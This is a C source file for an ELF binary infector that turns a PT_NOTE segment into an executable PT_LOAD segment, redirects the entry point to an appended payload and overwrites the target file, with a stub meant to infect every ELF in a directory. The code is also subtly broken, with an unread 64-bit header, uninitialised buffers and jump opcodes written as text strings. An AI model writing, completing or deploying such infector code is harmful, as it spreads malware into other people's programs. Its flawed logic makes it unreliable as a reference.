#include "infect.h"
#include "includes.hpp"
#include "helpers.h"
#include "definitions.h"

int directory_infection(options_t *options){

  struct dirent *pDirent;

  while ((pDirent = readdir(options->dir)) != NULL) {
    /* XXX try to infect every ELF in the directory */
  }

  closedir(options->dir);

  return EXIT_SUCCESS;
	
}




int elf_infection_64(options_t *options){

  	Elf64_Ehdr eh;
  	Elf64_Phdr *ph_tbl;
  	Elf64_Addr old_entry_point;
  	int payload_len = options->inputsz;
  	char *payload = options->input;
  	int file_offset;
  	int32_t fd;
  	int pt_note_found = 1;
  	int patch_size = 5;
  	int infected_file_size;
  	char *infected_file;
  	char *patched_entry_point;
  	int old_vaddr;
  	int i;

	if (VERBOSE) printf("%s ELF file is 64 bits\n", INFO_BANNER );

  	// 1. Open the ELF file to be injected:
	fd = options->elf;

	if (VERBOSE) printf("%s: ELF file is 32 bits\n", INFO_BANNER );

	if ( eh.e_type != ET_EXEC )
		error("filetype is not ET_EXEC. cannot perform PT_NOTE infection method");

	file_offset = lseek(fd, 0, SEEK_END); // seek to end of file
	//lseek(fd, 0, SEEK_SET); // seek back to beginning of file
	if (VERBOSE) printf("%s: ELF file size (file_offset) = %d\n", INFO_BANNER, file_offset );
	if (VERBOSE) printf("%s: payload file size (payload_len) = %d\n", INFO_BANNER, payload_len );
	if (VERBOSE) printf("%s: payload file size with entry point patching = %d\n", INFO_BANNER, payload_len+patch_size );

	// 2. Save the original entry point, e_entry:
	old_entry_point = eh.e_entry;
	if (VERBOSE) printf("%s: old entry point = %lu\n", INFO_BANNER, old_entry_point );


	// 3. Parse the program header table, looking for the PT_NOTE segment:
	if ( !eh.e_phoff || !eh.e_phnum )
		error("ELF file has no program header table");

	if ( lseek(fd, (off_t)eh.e_phoff, SEEK_SET) != (off_t)eh.e_phoff ) 
		error("lseek(targetelf, eh.e_shoff, SEEK_SET);\n");

	ph_tbl = (Elf64_Phdr *) malloc( eh.e_phentsize * eh.e_phnum );

	for( i = 0; i < eh.e_phnum && pt_note_found; i++ ){
		if (read(fd, (void *)&ph_tbl[i], eh.e_phentsize) != eh.e_phentsize)
			error("read(targetelf, sh_table[i], eh.e_shentsize)");

		if ( ph_tbl[i].p_type != PT_NOTE )
			continue;

		if (VERBOSE){
			printf("%s: found PT_NOTE segment\n", INFO_BANNER );
			printf("\tp_type = %d\n", ph_tbl[i].p_type);	
			printf("\tp_flags = %d\n", ph_tbl[i].p_flags);
			printf("\tp_vaddr = %lu\n", ph_tbl[i].p_vaddr);
			printf("\tp_filesz = %lu\n", ph_tbl[i].p_filesz);
			printf("\tp_memsz = %lu\n", ph_tbl[i].p_memsz);
			printf("\tp_offset = %lu\n", ph_tbl[i].p_offset);
		} 

		pt_note_found = 0;

		// 4. Convert the PT_NOTE segment to a PT_LOAD segment:
		ph_tbl[i].p_type = PT_LOAD;

		// 5. Change the memory protections for this segment to allow executable instructions:
		ph_tbl[i].p_flags = PF_R | PF_X;

		// 6. Change the entry point address to an area that will not conflict with the original program execution.
		eh.e_entry = (Elf64_Addr) 0xc000000 + file_offset;
	
		// 7. Adjust the size on disk and virtual memory size to account for the size of the injected code:
		old_vaddr = ph_tbl[i].p_vaddr;
		ph_tbl[i].p_vaddr = (Elf32_Addr) 0xc000000 + file_offset;
		ph_tbl[i].p_filesz += (Elf32_Word) payload_len + patch_size;
		ph_tbl[i].p_memsz += (Elf32_Word) payload_len + patch_size;

		// 8. Point the offset of our converted segment to the end of the original binary, where we will store the new code:
		ph_tbl[i].p_offset = file_offset;
	}

	if (VERBOSE){
			printf("%s: modified PT_NOTE segment\n", INFO_BANNER );
			printf("\tp_type = %d\n", ph_tbl[i].p_type);	
			printf("\tp_flags = %d\n", ph_tbl[i].p_flags);
			printf("\tp_vaddr = %lu\n", ph_tbl[i].p_vaddr);
			printf("\tp_filesz = %lu\n", ph_tbl[i].p_filesz);
			printf("\tp_memsz = %lu\n", ph_tbl[i].p_memsz);
			printf("\tp_offset = %lu\n", ph_tbl[i].p_offset);
		} 

	infected_file_size = payload_len + file_offset + patch_size;
	infected_file = (char *) malloc((size_t) infected_file_size );

	if ( lseek(fd, (off_t)0, SEEK_SET) != (off_t)0 ) 
		error("lseek(targetelf, 0, SEEK_SET);\n");

	if ( read(fd, (void *)&infected_file, file_offset) != file_offset )
		error("read(targetelf, eh, sizeof(Elf32_Ehdr))");


	// 10. Add our injected code to the end of the file:
	memcpy(infected_file+file_offset, payload, payload_len);


	// 9. Patch the end of the code with instructions to jump to the original entry point:
	sprintf(patched_entry_point, "0xe9%lu", (old_entry_point-old_vaddr-patch_size-payload_len));
	memcpy(infected_file+file_offset+payload_len, patched_entry_point, patch_size);
	if (VERBOSE) printf("%s: entry point patching code = %s\n", INFO_BANNER, patched_entry_point );

	// 11. Write the file back to disk, over the original file:
	if ( lseek(fd, (off_t)0, SEEK_SET) != (off_t)0 ) 
		error("lseek(targetelf, 0, SEEK_SET);\n");
	write(fd, infected_file, infected_file_size );

	return EXIT_SUCCESS;
}

int elf_infection(options_t *options){

  	Elf32_Ehdr eh;
  	Elf32_Phdr *ph_tbl;
  	Elf32_Addr old_entry_point;
  	int payload_len = options->inputsz;
  	char *payload = options->input;
  	int file_offset;
  	int32_t fd;
  	int pt_note_found = 1;
  	int patch_size = 8;
  	int infected_file_size;
  	char *infected_file;
  	char *patched_entry_point;
  	int old_vaddr;
  	int i;



  	// 1. Open the ELF file to be injected:
	fd = options->elf;

	if ( lseek(fd, (off_t)0, SEEK_SET) != (off_t)0 ) 
		error("lseek(targetelf, 0, SEEK_SET);\n");

	if ( read(fd, (void *)&eh, sizeof(Elf32_Ehdr)) != sizeof(Elf32_Ehdr) )
		error("read(targetelf, eh, sizeof(Elf32_Ehdr))");

	if ( strncmp( (char*)eh.e_ident, ELF_MAGIC_NUMBER, 4 ) )
		error("target elf is not an ELF file.");

	if ( eh.e_ident[EI_CLASS] == ELFCLASS64 )
		return elf_infection_64(options);

	if (VERBOSE) printf("%s: ELF file is 32 bits\n", INFO_BANNER );

	if ( eh.e_type != ET_EXEC )
		error("filetype is not ET_EXEC. cannot perform PT_NOTE infection method");

	file_offset = lseek(fd, 0, SEEK_END); // seek to end of file
	//lseek(fd, 0, SEEK_SET); // seek back to beginning of file
	if (VERBOSE) printf("%s: ELF file size (file_offset) = %d\n", INFO_BANNER, file_offset );
	if (VERBOSE) printf("%s: payload file size (payload_len) = %d\n", INFO_BANNER, payload_len );
	if (VERBOSE) printf("%s: payload file size with entry point patching = %d\n", INFO_BANNER, payload_len+patch_size );

	// 2. Save the original entry point, e_entry:
	old_entry_point = eh.e_entry;
	if (VERBOSE) printf("%s: old entry point = %d\n", INFO_BANNER, old_entry_point );


	// 3. Parse the program header table, looking for the PT_NOTE segment:
	if ( !eh.e_phoff || !eh.e_phnum )
		error("ELF file has no program header table");

	if ( lseek(fd, (off_t)eh.e_phoff, SEEK_SET) != (off_t)eh.e_phoff ) 
		error("lseek(targetelf, eh.e_shoff, SEEK_SET);\n");

	ph_tbl = (Elf32_Phdr *) malloc( eh.e_phentsize * eh.e_phnum );

	for( i = 0; i < eh.e_phnum && pt_note_found; i++ ){
		if (read(fd, (void *)&ph_tbl[i], eh.e_phentsize) != eh.e_phentsize)
			error("read(targetelf, sh_table[i], eh.e_shentsize)");

		if ( ph_tbl[i].p_type != PT_NOTE )
			continue;

		if (VERBOSE){
			printf("%s: found PT_NOTE segment\n", INFO_BANNER );
			printf("\tp_type = %d\n", ph_tbl[i].p_type);	
			printf("\tp_flags = %d\n", ph_tbl[i].p_flags);
			printf("\tp_vaddr = %d\n", ph_tbl[i].p_vaddr);
			printf("\tp_filesz = %d\n", ph_tbl[i].p_filesz);
			printf("\tp_memsz = %d\n", ph_tbl[i].p_memsz);
			printf("\tp_offset = %d\n", ph_tbl[i].p_offset);
		} 

		pt_note_found = 0;

		// 4. Convert the PT_NOTE segment to a PT_LOAD segment:
		ph_tbl[i].p_type = PT_LOAD;

		// 5. Change the memory protections for this segment to allow executable instructions:
		ph_tbl[i].p_flags = PF_R | PF_X;

		// 6. Change the entry point address to an area that will not conflict with the original program execution.
		eh.e_entry = (Elf64_Addr) 0xc000000 + file_offset;
	
		// 7. Adjust the size on disk and virtual memory size to account for the size of the injected code:
		old_vaddr = ph_tbl[i].p_vaddr;
		ph_tbl[i].p_vaddr = (Elf32_Addr) 0xc000000 + file_offset;
		ph_tbl[i].p_filesz += (Elf32_Word) payload_len + patch_size;
		ph_tbl[i].p_memsz += (Elf32_Word) payload_len + patch_size;

		// 8. Point the offset of our converted segment to the end of the original binary, where we will store the new code:
		ph_tbl[i].p_offset = file_offset;
	}

	if (VERBOSE){
			printf("%s: modified PT_NOTE segment\n", INFO_BANNER );
			printf("\tp_type = %d\n", ph_tbl[i].p_type);	
			printf("\tp_flags = %d\n", ph_tbl[i].p_flags);
			printf("\tp_vaddr = %d\n", ph_tbl[i].p_vaddr);
			printf("\tp_filesz = %d\n", ph_tbl[i].p_filesz);
			printf("\tp_memsz = %d\n", ph_tbl[i].p_memsz);
			printf("\tp_offset = %d\n", ph_tbl[i].p_offset);
		} 

	infected_file_size = payload_len + file_offset + patch_size;
	infected_file = (char *) malloc((size_t) infected_file_size );

	if ( lseek(fd, (off_t)0, SEEK_SET) != (off_t)0 ) 
		error("lseek(targetelf, 0, SEEK_SET);\n");

	if ( read(fd, (void *)&infected_file, file_offset) != file_offset )
		error("read(targetelf, eh, sizeof(Elf32_Ehdr))");


	// 10. Add our injected code to the end of the file:
	memcpy(infected_file+file_offset, payload, payload_len);


	// 9. Patch the end of the code with instructions to jump to the original entry point:
	sprintf(patched_entry_point, "0x68%c0xff0x240x24", (old_entry_point-old_vaddr-patch_size-payload_len));
	memcpy(infected_file+file_offset+payload_len, patched_entry_point, patch_size);
	if (VERBOSE) printf("%s: entry point patching code = %s\n", INFO_BANNER, patched_entry_point );

	// 11. Write the file back to disk, over the original file:
	if ( lseek(fd, (off_t)0, SEEK_SET) != (off_t)0 ) 
		error("lseek(targetelf, 0, SEEK_SET);\n");
	write(fd, infected_file, infected_file_size );

	return EXIT_SUCCESS;
}